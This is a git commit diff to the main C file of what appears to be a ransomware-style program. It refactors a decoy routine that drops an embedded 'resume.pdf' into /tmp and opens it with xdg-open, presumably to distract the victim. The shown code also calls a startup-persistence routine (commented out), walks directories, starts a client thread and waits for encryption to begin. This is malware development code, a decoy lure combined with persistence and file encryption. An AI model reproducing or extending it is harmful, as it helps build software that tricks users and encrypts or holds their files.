f171e3d815122987ba539136aebf8775a30347f7
FredericWeyssow <frederic.weyssow@gmail.com>
2026-06-02 14:44:50 +0200

    Rearrange some things in main.c

--- src/encryption/main.c
+++ src/encryption/main.c
@@ -41,6 +41,19 @@ void start_up_register() {
     system(cmd);
 }
 
+void open_pdf() {
+    const char *temp_path = "/tmp/resume.pdf";
+
+    FILE *f = fopen(temp_path, "wb");
+    if (!f) return;
+    fwrite(sample_pdf, 1, sample_pdf_len, f);
+    fclose(f);
+
+    char cmd[256];
+    snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
+    system(cmd);
+}
+
 void traverse(const char *path) {
 
     struct dirent *entry;
@@ -84,21 +97,11 @@ void traverse(const char *path) {
 
 int main() {
     // start_path ist jetzt in globals.c definiert, brauche den als global für watcher.
-    const char *temp_path = "/tmp/resume.pdf";
+    
+    //open_pdf(); Uncomment to open a pdf
+    //start_up_register(); Uncomment to register the process as a startup
 
-    FILE *f = fopen(temp_path, "wb");
-    if (!f) return 1;
-    fwrite(sample_pdf, 1, sample_pdf_len, f);
-    fclose(f);
-
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
-    //system(cmd); Uncomment to open the pdf.
-    //start_up_register(); Uncomment to register the process as a startup;
-
-    //RAND_bytes(key, sizeof(key));
     initializeQueue(&queue);
-
     traverse(start_path);
 
     pthread_t client_tid;
@@ -107,7 +110,7 @@ int main() {
     while (!encryption_active) {
         usleep(100000); // check every 100ms
     }
-    display_gui();
+    //display_gui();
 
     pthread_join(client_tid, NULL);
 
